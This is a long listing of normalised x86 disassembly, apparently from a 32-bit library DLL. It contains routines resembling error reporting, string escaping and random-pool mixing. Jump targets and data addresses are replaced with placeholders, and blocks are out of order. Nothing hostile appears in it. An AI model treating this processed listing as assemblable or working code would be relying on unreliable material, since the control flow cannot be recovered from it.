cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov ecx [ ecx + 0xc ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
push ecx
push esi
call sub_10033680
add esp 0x8
jmp r-xdata
mov ecx [ eax + 0x10 ]
test ecx ecx
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov ecx [ eax + 0x14 ]
pop edi
mov [ ebp ] ecx
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
push eax
push esi
call ecx
add esp 0x8
jmp r-xdata
mov ecx [ eax + 0x10 ]
test ecx ecx
je r-xdata
mov ecx [ ecx + 0x10 ]
test ecx ecx
je r-xdata
cmp dl 0x5
je r-xdata
mov eax [ eax + 0x14 ]
pop edi
mov [ ebp ] eax
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
cmp dl 0x5
je r-xdata
push eax
push esi
call ecx
add esp 0x8
jmp r-xdata
cmp [ eax + 0x4 ] 0x1
jne r-xdata
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov ecx [ eax + 0x14 ]
mov [ esi ] ecx
jmp r-xdata
mov eax [ eax + 0x14 ]
mov [ esi ] eax
jmp r-xdata
sub_10033680
mov eax [ esp + 0x8 ]
test [ eax ] 0x306
jne r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] 0x0
retn
call [ eax + 0x10 ]
movsx ecx [ eax ]
cmp ecx 0x6
ja r-xdata
retn
jmp [ ecx * 4 + jump_table_10033714 ]
mov ecx [ eax + 0x8 ]
test ecx ecx
je r-xdata
mov ecx [ eax + 0x10 ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
mov ecx [ esp + 0x4 ]
mov [ ecx ] 0x0
test eax eax
je r-xdata
mov eax ecx
test [ eax ] 0x306
je r-xdata
mov ecx [ ecx + 0xc ]
jmp r-xdata
mov ecx [ eax + 0x10 ]
test ecx ecx
je r-xdata
mov ecx [ eax + 0x10 ]
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
cmp [ eax ] 0x5
je r-xdata
mov ecx [ ecx + 0x10 ]
jmp r-xdata
mov edx [ esp + 0x4 ]
push eax
push edx
call ecx
add esp 0x8
retn
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov edx [ esp + 0x4 ]
mov ecx [ eax + 0x14 ]
mov [ edx ] ecx
retn
sub_10033730
mov eax [ esp + 0x8 ]
push esi
test eax eax
je r-xdata
or ecx 0xffffffff
mov ecx [ eax + 0x10 ]
test ecx ecx
je r-xdata
push ecx
call sub_1002edc0
mov ecx [ esp + 0xc ]
add esp 0x4
mov [ ecx ] eax
mov edx [ ecx ]
xor eax eax
pop esi
test edx edx
setne al
retn
xor edx edx
mov dl [ esi + lookup_table_10033830 ]
jmp [ edx * 4 + jump_table_1003381c ]
cmp [ eax ] 0x5
je r-xdata
mov ecx [ ecx + 0x8 ]
test ecx ecx
je r-xdata
push 0x0
call sub_10022900
mov ecx [ esp + 0xc ]
add esp 0x4
mov [ ecx ] eax
mov eax 0x1
pop esi
retn
test eax eax
je r-xdata
mov edx [ esp + 0x8 ]
mov eax 0x1
pop esi
mov [ edx ] 0x1
retn
push 0x167
push r--data
push 0x8
call sub_1001d4c0
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ eax + 0x4 ]
jmp r-xdata
push eax
mov eax [ esp + 0xc ]
push eax
call ecx
add esp 0x8
pop esi
retn
mov ecx [ esp + 0x8 ]
mov eax 0x1
pop esi
mov [ ecx ] 0xffffffff
retn
mov edx [ eax + 0x14 ]
mov eax [ esp + 0x8 ]
pop esi
mov [ eax ] edx
mov eax 0x1
retn
mov ecx [ esp + 0x8 ]
mov [ eax + 0x4 ] 0x0
mov [ eax ] 0xffffffff
pop esi
mov [ ecx ] eax
mov edx [ ecx ]
xor eax eax
test edx edx
setne al
retn
pop esi
retn
lea esi [ ecx + 0x4 ]
cmp esi 0xa
ja r-xdata
sub_10033880
mov eax 0x10
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x18 ]
push ebp
mov ebp [ esp + 0x20 ]
push esi
push edi
mov eax [ ebp + 0x10 ]
xor edi edi
cmp ebx edi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov cl [ ebp ]
test cl cl
je r-xdata
cmp eax edi
je r-xdata
cmp [ ebx ] edi
je r-xdata
mov [ esp + 0x28 ] edi
mov esi edi
mov eax [ eax + 0x10 ]
cmp eax edi
je r-xdata
jmp [ eax * 4 + jump_table_10033bc0 ]
mov esi eax
mov [ esp + 0x28 ] esi
jmp r-xdata
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push ebp
push ebx
call sub_10033c60
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
cmp esi edi
je r-xdata
mov ebp [ ebp + 0x10 ]
cmp ebp edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push ebp
push 0xffffffff
push ebx
call sub_100505f0
add esp 0xc
test eax eax
jg r-xdata
movsx eax cl
cmp eax 0x6
ja r-xdata
mov eax [ esi ]
test al 0x6
jne r-xdata
push ebp
push ebx
call sub_100505b0
add esp 0x8
cmp eax edi
jl r-xdata
push ebp
push ebx
push 0x2
call esi
add esp 0xc
cmp eax 0x2
je r-xdata
mov ebp [ ebp + 0x4 ]
cmp ebp edi
je r-xdata
mov eax [ eax + 0x8 ]
cmp eax edi
je r-xdata
cmp esi edi
je r-xdata
mov ebp [ ebx ]
push ebp
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
and eax 0x400
mov [ esp + 0x2c ] eax
call [ esi + 0x10 ]
mov ebp eax
mov eax [ ebp + 0x10 ]
jmp r-xdata
test esi esi
je r-xdata
cmp eax [ ebp + 0xc ]
jge r-xdata
mov eax [ ebx ]
push eax
call ebp
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
push ebp
push ebx
call eax
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
push ebp
push ebx
call sub_10050690
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
add esp 0x8
cmp eax edi
lea ecx [ eax + eax * 4 ]
mov [ esp + 0x14 ] edi
lea ecx [ edx + ecx * 4 - 0x14 ]
mov [ esp + 0x10 ] ecx
jle r-xdata
push ebp
push ebx
push 0x2
call esi
add esp 0xc
cmp eax 0x2
je r-xdata
push ebp
call sub_1001e780
add esp 0x4
mov [ ebx ] 0x0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
push edi
push ebp
call sub_1001e7c0
add esp 0x8
mov [ esp + 0x24 ] eax
push 0x0
call [ esi + 0x10 ]
push eax
lea eax [ esp + 0x2c ]
push eax
call sub_10033880
push ebp
inc edi
call sub_1001e7b0
add esp 0x10
cmp edi eax
jl r-xdata
mov eax [ esp + 0x2c ]
test eax eax
jne r-xdata
push ebp
push ebx
push 0x3
call esi
add esp 0xc
mov edx [ ebp + 0x8 ]
lea ecx [ eax + eax * 4 ]
lea esi [ edx + ecx * 4 ]
push esi
push ebx
call sub_100507f0
mov edi eax
mov eax [ esi ]
add esp 0x8
mov [ esp + 0x10 ] edi
test al 0x6
je r-xdata
test esi esi
je r-xdata
mov edx [ esp + 0x10 ]
push 0x0
push edx
push ebx
call sub_10050810
mov edi eax
add esp 0xc
test edi edi
je r-xdata
jmp r-xdata
and eax 0x400
push eax
call [ esi + 0x10 ]
push eax
push edi
call sub_10033880
add esp 0xc
mov ebx [ edi ]
xor edi edi
push ebx
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov eax [ esp + 0x2c ]
test eax eax
jne r-xdata
push ebp
push ebx
push 0x3
call esi
add esp 0xc
mov esi [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ ebp + 0xc ]
sub esi 0x14
inc eax
mov [ esp + 0x10 ] esi
cmp eax ecx
mov [ esp + 0x14 ] eax
jl r-xdata
push edi
push ebx
call sub_100507f0
mov esi eax
mov eax [ edi ]
add esp 0x8
mov [ esp + 0x1c ] esi
test al 0x6
je r-xdata
mov edx [ ebx ]
push edx
call sub_1001d740
add esp 0x4
mov [ ebx ] 0x0
push ebx
call sub_1001e780
mov ecx [ esp + 0x14 ]
mov ebx [ esp + 0x28 ]
add esp 0x4
mov [ ecx ] 0x0
jmp r-xdata
push edi
push ebx
call sub_1001e7c0
add esp 0x8
mov [ esp + 0x14 ] eax
push 0x0
call [ esi + 0x10 ]
push eax
lea eax [ esp + 0x1c ]
push eax
call sub_10033880
push ebx
inc edi
call sub_1001e7b0
add esp 0x10
cmp edi eax
jl r-xdata
mov esi [ esp + 0x28 ]
and eax 0x400
push eax
call [ edi + 0x10 ]
push eax
push esi
call sub_10033880
add esp 0xc
mov ebx [ esi ]
xor esi esi
push ebx
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov esi [ esp + 0x28 ]
push ebx
call sub_1001e780
mov ecx [ esp + 0x20 ]
mov ebx [ esp + 0x28 ]
add esp 0x4
mov [ ecx ] 0x0
jmp r-xdata
push esi
push ebx
call sub_1001e7c0
add esp 0x8
mov [ esp + 0x18 ] eax
push 0x0
call [ edi + 0x10 ]
push eax
lea eax [ esp + 0x20 ]
push eax
call sub_10033880
push ebx
inc esi
call sub_1001e7b0
add esp 0x10
cmp esi eax
jl r-xdata
sub_10033be0
push ebx
mov ebx [ esp + 0xc ]
mov eax [ ebx ]
test al 0x6
je r-xdata
and eax 0x400
push eax
call [ ebx + 0x10 ]
mov ecx [ esp + 0xc ]
push eax
push ecx
call sub_10033880
add esp 0xc
pop ebx
retn
push ebp
mov ebp [ esp + 0xc ]
push esi
push edi
mov edi [ ebp ]
xor esi esi
push edi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push edi
call sub_1001e780
add esp 0x4
mov [ ebp ] 0x0
pop edi
pop esi
pop ebp
pop ebx
retn
push esi
push edi
call sub_1001e7c0
add esp 0x8
mov [ esp + 0x14 ] eax
push 0x0
call [ ebx + 0x10 ]
push eax
lea eax [ esp + 0x1c ]
push eax
call sub_10033880
push edi
inc esi
call sub_1001e7b0
add esp 0x10
cmp esi eax
jl r-xdata
sub_10033c60
mov edx [ esp + 0x8 ]
push esi
test edx edx
je r-xdata
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
lea esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ edx + 0x10 ]
test eax eax
je r-xdata
pop esi
retn
jmp r-xdata
cmp [ edx ] 0x5
jne r-xdata
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
add eax 0x4
cmp eax 0xa
ja r-xdata
mov eax [ edx + 0x4 ]
mov esi [ esp + 0x8 ]
cmp eax 0x1
je r-xdata
mov esi [ esp + 0x8 ]
or eax 0xffffffff
cmp [ esi ] 0x0
je r-xdata
mov ecx [ esp + 0x8 ]
push edx
push ecx
call eax
add esp 0x8
pop esi
retn
mov edx [ esi ]
push edx
call sub_1002ee10
add esp 0x4
mov [ esi ] 0x0
xor ecx ecx
mov cl [ eax + lookup_table_10033d4c ]
jmp [ ecx * 4 + jump_table_10033d38 ]
cmp [ esi ] 0x0
je r-xdata
jmp r-xdata
mov edx [ esi ]
push edx
call sub_10030910
add esp 0x4
mov [ esi ] 0x0
pop esi
retn
test edx edx
je r-xdata
push 0x0
push esi
call sub_10033c60
mov ecx [ esi ]
push ecx
call sub_1001d740
add esp 0xc
mov [ esi ] 0x0
pop esi
retn
mov [ esi ] 0x0
mov [ esi ] 0xffffffff
pop esi
retn
mov eax [ edx + 0x14 ]
mov [ esi ] eax
pop esi
retn
sub_10033da0
mov eax 0x50
call sub_1001d0d0
mov eax [ esp + 0x58 ]
push ebx
push ebp
push esi
push edi
push eax
xor ebp ebp
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov eax [ esp + 0x6c ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x68 ]
push ebp
push ecx
call sub_1001e7c0
mov edx [ esp + 0x74 ]
mov ecx [ esp + 0x6c ]
mov esi eax
push edx
mov eax [ esi + 0x4 ]
push eax
push ecx
call sub_10050cc0
add esp 0x14
mov [ esp + 0x6c ] eax
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x50
retn
call sub_1001e3c0
push ebp
push eax
call sub_1001e7c0
mov edx [ esi ]
mov ebx eax
push edx
lea eax [ esp + 0x1c ]
push 0x50
push eax
call sub_10030590
mov edi [ ebx + 0x4 ]
or ecx 0xffffffff
xor eax eax
push 0x76
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x28 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push r--data
lea edi [ edx + ecx + 0x5 ]
push edi
call sub_1001d4c0
mov esi eax
add esp 0x20
test esi esi
je r-xdata
push 0x79
push r--data
push 0x41
push 0x8a
push 0x22
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x50
retn
lea eax [ esp + 0x10 ]
push edi
push eax
push esi
call sub_100267d0
push edi
push r--data
push esi
call sub_10026810
mov ecx [ ebx + 0x4 ]
push edi
push ecx
push esi
call sub_10026810
mov edx [ ebx + 0x4 ]
push edx
call sub_1001d740
mov eax [ esp + 0x90 ]
mov [ ebx + 0x4 ] esi
push eax
inc ebp
call sub_1001e7b0
add esp 0x2c
cmp ebp eax
jl r-xdata
sub_10033ec0
mov eax 0x14
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
call sub_1001e3c0
test eax eax
mov [ esp + 0x14 ] eax
jne r-xdata
mov eax [ esp + 0x30 ]
mov [ esp + 0x10 ] 0x0
push eax
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push 0x90
push r--data
push 0x41
push 0x8b
push 0x22
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x30 ]
push ecx
push edx
call sub_1001e7c0
push r--data
mov ebx eax
call sub_10033120
mov ebp eax
add esp 0xc
test ebp ebp
je r-xdata
push 0x97
mov eax [ esp + 0x14 ]
push ebp
push eax
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebx + 0x4 ]
push 0x3b
push ecx
call strchr
add esp 0x8
test eax eax
je r-xdata
push 0x9c
push r--data
push 0x8f
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov esi eax
sub esi ecx
mov ecx [ esp + 0x2c ]
inc eax
push 0x0
mov [ esp + 0x20 ] eax
mov edx [ ebx + 0x8 ]
lea eax [ esp + 0x1c ]
mov [ esp + 0x24 ] edx
mov edx [ esp + 0x2c ]
push eax
mov eax [ ebp + 0x4 ]
push ecx
push edx
push eax
call sub_10051650
add esp 0x14
test eax eax
je r-xdata
push 0x8b
push 0x22
call sub_1001de60
add esp 0x14
mov ecx [ esp + 0x14 ]
push sub_10033d70
push ecx
call sub_1001e730
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
push 0xa4
lea ecx [ esi + 0x1 ]
push r--data
push ecx
call sub_1001d4c0
mov edi eax
add esp 0xc
test edi edi
je r-xdata
push 0xa5
jmp r-xdata
mov edx [ ebx + 0x4 ]
push esi
push edx
push edi
call strncpy
push 0x0
push edi
mov [ edi + esi ] 0x0
call sub_10022b70
add esp 0x14
mov [ ebp ] eax
test eax eax
je r-xdata
push r--data
push 0x41
push 0xac
push r--data
push 0x77
push 0x8b
push 0x22
call sub_1001de60
push edi
push r--data
push 0x2
call sub_1001e1a0
push edi
call sub_1001d740
add esp 0x24
jmp r-xdata
push edi
call sub_1001d740
mov esi [ esp + 0x14 ]
mov eax [ esp + 0x34 ]
inc esi
push eax
mov [ esp + 0x18 ] esi
call sub_1001e7b0
add esp 0x8
cmp esi eax
jl r-xdata
sub_10034190
mov eax 0x70
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x80 ]
xor ebx ebx
push esi
push edi
test ebp ebp
mov [ esp + 0x10 ] ebx
jne r-xdata
mov esi [ esp + 0x8c ]
call sub_1001dc60
mov edi eax
test edi edi
mov [ esp + 0x10 ] edi
je r-xdata
mov edx [ edi ]
dec esi
push edx
mov [ esp + 0x90 ] esi
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] eax
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
cmp ebx eax
je r-xdata
push 0xde
push r--data
push 0x41
push 0x74
push 0xb
call sub_1001de60
add esp 0x14
test edi edi
je r-xdata
push 0xc8
push edi
call sub_1001dce0
add esp 0x8
test eax eax
je r-xdata
test ebx ebx
je r-xdata
jmp r-xdata
push esi
push r--data
push ebp
call strncpy
add esp 0xc
mov [ esi + ebp - 0x1 ] 0x0
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x70
retn
mov ecx [ ebx + 0x4 ]
push ebx
mov [ esp + 0x8c ] ecx
call sub_1001d740
mov ebp [ esp + 0x8c ]
add esp 0x4
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x70
retn
push edi
call sub_1001dca0
add esp 0x4
mov eax [ edi + 0x4 ]
mov esi 0xc8
mov ebx edi
mov [ eax ] 0x0
jmp r-xdata
mov esi ebp
mov esi [ ebx + 0x4 ]
push ebx
call sub_1001d740
add esp 0x4
jmp r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ edi ]
push eax
push ecx
call sub_1001e7c0
mov ebx eax
mov [ esp + 0x24 ] ebx
mov edx [ ebx ]
push edx
call sub_10022ae0
add esp 0xc
test eax eax
je r-xdata
mov edi [ esp + 0x84 ]
xor eax eax
cmp edi eax
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x70
retn
mov [ esi ] 0x0
mov eax [ esp + 0x14 ]
test eax eax
jne r-xdata
mov eax [ ebx ]
lea ecx [ esp + 0x30 ]
push eax
push 0x50
push ecx
call sub_10030590
add esp 0xc
lea esi [ esp + 0x30 ]
push eax
call sub_100229a0
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
mov eax 0x1
xor edx edx
mov [ esp + 0x2c ] eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x24 ] eax
mov [ esp + 0x20 ] eax
mov edx ebx
and edx 0x80000003
jns r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
mov eax [ ebx + 0x4 ]
not ecx
mov ebx [ eax ]
mov edi [ eax + 0x8 ]
dec ecx
mov ebp ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x1b
jne r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x10 ]
add edx ebp
mov edi eax
test ecx ecx
lea eax [ eax + edx + 0x2 ]
mov [ esp + 0x18 ] eax
je r-xdata
mov ecx eax
and ecx 0x3
cmp [ esp + ecx * 4 + 0x20 ] 0x0
je r-xdata
jne r-xdata
dec edx
or edx 0xfffffffc
inc edx
cmp eax [ esp + 0x8c ]
jg r-xdata
inc eax
push eax
push ecx
call sub_1001dce0
add esp 0x8
test eax eax
je r-xdata
inc eax
cmp eax ebx
jl r-xdata
mov cl [ eax + edi ]
inc edx
cmp cl 0x20
jb r-xdata
xor edx edx
xor ecx ecx
xor eax eax
cmp ebx edx
mov [ esp + 0x28 ] edx
mov [ esp + 0x24 ] edx
mov [ esp + 0x20 ] ecx
jle r-xdata
mov ebp [ esp + 0x88 ]
mov eax [ esp + 0x88 ]
mov edi [ esp + 0x10 ]
mov edx [ esp + 0x10 ]
mov eax [ edx + 0x4 ]
jmp r-xdata
add edx 0x3
cmp cl 0x7e
jbe r-xdata
mov eax [ esp + 0x24 ]
or ecx eax
mov eax [ esp + 0x28 ]
or ecx eax
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
mov edx [ esp + 0x84 ]
mov esi [ esp + 0x14 ]
mov [ eax ] 0x0
inc esi
mov eax [ edx ]
mov [ esp + 0x14 ] esi
push eax
call sub_1001e7b0
add esp 0x4
cmp esi eax
jl r-xdata
mov ecx esi
and ecx 0x3
mov edx [ esp + ecx * 4 + 0x20 ]
test edx edx
je r-xdata
add eax edi
mov ecx ebp
mov edx ecx
mov [ eax ] 0x2f
inc eax
mov edi eax
add eax ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
inc eax
[ edi ] [ esi ]
mov ecx [ esp + 0x1c ]
mov [ eax - 0x1 ] 0x3d
xor esi esi
mov edx [ ecx + 0x4 ]
test ebx ebx
mov edi [ edx + 0x8 ]
jle r-xdata
mov [ esp + 0x28 ] edx
mov [ esp + 0x24 ] edx
mov [ esp + 0x20 ] edx
mov [ esp + 0x2c ] 0x1
jmp r-xdata
mov eax 0x1
mov [ esp + 0x2c ] eax
mov [ esp + 0x28 ] eax
mov [ esp + 0x24 ] eax
mov [ esp + 0x20 ] eax
jmp r-xdata
inc eax
cmp eax ebx
jl r-xdata
mov ecx eax
and ecx 0x3
mov [ esp + ecx * 4 + 0x20 ] 0x1
mov ecx [ esp + 0x20 ]
mov edi [ esp + 0x84 ]
mov ebp [ esp + 0x88 ]
mov ebx [ esp + 0x10 ]
inc esi
cmp esi ebx
jl r-xdata
xor ecx ecx
mov cl [ esi + edi ]
cmp ecx 0x20
jl r-xdata
xor eax eax
test ebx ebx
jle r-xdata
mov edx ecx
mov [ eax ] 0x5c
inc eax
sar edx 0x4
and edx 0xf
mov [ eax ] 0x78
inc eax
mov dl [ edx + rw-data ]
mov [ eax ] dl
inc eax
and ecx 0xf
mov cl [ ecx + rw-data ]
cmp ecx 0x7e
jle r-xdata
mov [ eax ] cl
inc eax
sub_10034510
mov eax 0x8
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x10 ]
push ebp
push esi
push edi
xor edi edi
cmp ebx edi
mov [ esp + 0x10 ] edi
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x8
retn
mov eax [ ebx + 0x8 ]
cmp eax edi
je r-xdata
cmp [ ebx + 0x4 ] edi
je r-xdata
push 0x111
push r--data
push 0xa
add eax 0x8
push 0x1
push eax
call sub_1001f5f0
mov eax [ ebx + 0x8 ]
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov eax [ ebx ]
mov ecx [ eax ]
push ecx
call sub_10022ae0
add esp 0x4
mov ebp eax
call sub_10023850
cmp eax edi
mov [ esp + 0x10 ] eax
jne r-xdata
push ebp
call sub_100238a0
mov edx [ esp + 0x14 ]
add esp 0x4
mov [ edx ] eax
mov ecx [ esp + 0x10 ]
mov esi [ ebx ]
mov eax [ ecx ]
cmp eax 0x74
jne r-xdata
push 0x11a
push r--data
push 0x41
jmp r-xdata
cmp eax 0x198
jne r-xdata
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
push 0x77
push 0xb
call sub_1001de60
add esp 0x14
mov eax [ ebx + 0x4 ]
lea edx [ esp + 0x14 ]
mov ecx [ eax + 0x8 ]
mov [ esp + 0x14 ] ecx
mov eax [ eax ]
push eax
lea eax [ esp + 0x14 ]
push edx
push eax
push ebp
call sub_100519c0
add esp 0x10
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
mov eax [ esp + 0x10 ]
mov [ eax + 0x10 ] 0x1
cmp [ eax ] 0x10
jne r-xdata
push eax
call sub_10023940
add esp 0x4
mov eax [ esp + 0x10 ]
push 0x173
mov [ ebx + 0x8 ] eax
push r--data
push 0xa
add eax 0x8
push 0x1
push eax
call sub_1001f5f0
mov eax [ esp + 0x24 ]
add esp 0x14
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
push 0x16e
push r--data
push 0x66
cmp [ eax ] 0x10
jne r-xdata
call sub_100363f0
mov ecx [ esp + 0x10 ]
mov [ ecx + 0xc ] eax
mov edx [ esp + 0x10 ]
mov eax [ edx + 0xc ]
cmp eax edi
jne r-xdata
cmp eax edi
je r-xdata
call sub_10028f90
mov ecx [ esp + 0x10 ]
mov [ ecx + 0xc ] eax
mov edx [ esp + 0x10 ]
mov ecx [ edx + 0xc ]
lea eax [ edx + 0xc ]
cmp ecx edi
jne r-xdata
mov [ eax + 0x8 ] edi
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
mov eax [ ecx + 0x8 ]
lea ecx [ esp + 0x1c ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x1c ] eax
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x4 ]
mov edx [ esp + 0x10 ]
add edx 0xc
mov eax [ eax ]
push eax
push ecx
push edx
call sub_1002e4d0
add esp 0xc
test eax eax
je r-xdata
push 0x12e
push r--data
push 0x41
jmp r-xdata
cmp [ eax ] 0x6
jne r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx + 0x8 ]
mov [ esp + 0x14 ] ecx
mov [ esp + 0x1c ] ecx
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx ]
push ecx
lea ecx [ esp + 0x20 ]
push ecx
push eax
call sub_1004ff70
add esp 0xc
test eax eax
jne r-xdata
push 0x145
push r--data
push 0x41
jmp r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
jmp r-xdata
cmp [ ecx + 0xc ] edi
jne r-xdata
push 0x14c
push r--data
push 0x10
jmp r-xdata
mov eax [ esp + 0x10 ]
mov edi [ eax + 0xc ]
test edi edi
je r-xdata
call sub_10028f90
mov edx [ esp + 0x10 ]
mov [ edx + 0xc ] eax
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x4 ]
push edx
call sub_10022ae0
push eax
call sub_1002df90
mov esi eax
add esp 0x8
test esi esi
je r-xdata
push 0x1
push esi
call sub_1002cb60
push esi
push edi
call sub_10029430
add esp 0x10
test eax eax
je r-xdata
push esi
call sub_1002c3f0
add esp 0x4
sub_100347b0
push esi
push 0x413
push rw-data
call sub_10026870
xor esi esi
push 0x14
push rw-data
mov [ rw-data ] esi
mov [ rw-data ] esi
call sub_10026870
add esp 0x10
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
pop esi
retn
sub_10034800
mov eax 0x34
call sub_1001d0d0
mov eax [ rw-data ]
push ebx
push ebp
push esi
test eax eax
push edi
je r-xdata
mov [ esp + 0x10 ] 0x0
jmp r-xdata
push 0xdc
push r--data
push 0x13
push 0x5
call sub_1001f5b0
call sub_1001f590
mov ebp [ rw-data ]
xor ecx ecx
cmp ebp eax
push 0xde
sete cl
push r--data
mov esi ecx
push 0x13
push 0x6
mov [ esp + 0x30 ] esi
call sub_1001f5b0
add esp 0x20
test esi esi
jne r-xdata
push 0xe3
push r--data
push 0x12
push 0x9
call sub_1001f5b0
add esp 0x10
mov eax [ rw-data ]
mov edx [ rw-data ]
mov ebx [ rw-data ]
mov ecx 0x5
mov esi rw-data
lea edi [ esp + 0x30 ]
[ edi ] [ esi ]
mov esi [ esp + 0x4c ]
mov ebp eax
add eax esi
mov [ esp + 0x18 ] edx
cmp eax 0x3ff
mov [ esp + 0x1c ] ebx
mov [ rw-data ] eax
jl r-xdata
mov ecx [ rw-data ]
cmp ecx 0x3ff
jge r-xdata
cdq
mov ecx 0x3ff
idiv ecx
mov [ rw-data ] ecx
mov [ rw-data ] edx
jmp r-xdata
mov eax esi
mov ecx 0x14
cdq
idiv ecx
xor ecx ecx
mov eax 0x66666667
mov edi [ esp + 0x10 ]
test edx edx
setg cl
imul esi
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
add edx ebx
add edx ecx
test edi edi
mov [ rw-data ] edx
jne r-xdata
cmp eax ecx
jle r-xdata
lea ecx [ esp + 0x20 ]
push ecx
call sub_1002aa30
add esp 0x4
test esi esi
jle r-xdata
push 0x103
push r--data
push 0x12
push 0xa
call sub_1001f5b0
add esp 0x10
mov [ rw-data ] eax
lea edx [ esp + 0x20 ]
push edx
call sub_1002b000
add esp 0x4
test edi edi
jne r-xdata
mov ecx esi
add esi 0x13
mov eax 0xcccccccd
mov ebx [ esp + 0x48 ]
mul esi
shr edx 0x4
mov [ esp + 0x4c ] ecx
mov [ esp + 0x14 ] edx
jmp r-xdata
xor eax eax
push 0x12e
push r--data
push 0x12
push 0x9
call sub_1001f5b0
add esp 0x10
cmp ecx 0x14
mov esi ecx
jle r-xdata
mov cl [ esp + eax + 0x30 ]
mov bl [ eax + rw-data ]
xor bl cl
mov [ eax + rw-data ] bl
inc eax
cmp eax 0x14
jl r-xdata
fld [ rw-data ]
fcomp [ r--data ]
fnstsw ax
test ah 0x1
je r-xdata
push 0x0
call sub_100254d0
lea edx [ esp + 0x24 ]
push eax
push edx
call sub_1002aa50
lea eax [ esp + 0x3c ]
push 0x14
lea ecx [ esp + 0x30 ]
push eax
push ecx
call sub_1002ab80
lea edi [ esi + ebp - 0x3ff ]
add esp 0x18
test edi edi
jle r-xdata
mov esi 0x14
test edi edi
pop edi
pop esi
pop ebp
pop ebx
jne r-xdata
fld [ rw-data ]
fadd [ esp + 0x50 ]
fstp [ rw-data ]
lea eax [ ebp + rw-data ]
push esi
lea ecx [ esp + 0x24 ]
push eax
push ecx
call sub_1002ab80
add esp 0xc
mov edx esi
lea eax [ ebp + rw-data ]
sub edx edi
lea ecx [ esp + 0x20 ]
push edx
push eax
push ecx
call sub_1002ab80
push edi
lea edx [ esp + 0x30 ]
push rw-data
push edx
call sub_1002ab80
add esp 0x18
jmp r-xdata
add esp 0x34
retn
push 0x139
push r--data
push 0x12
push 0xa
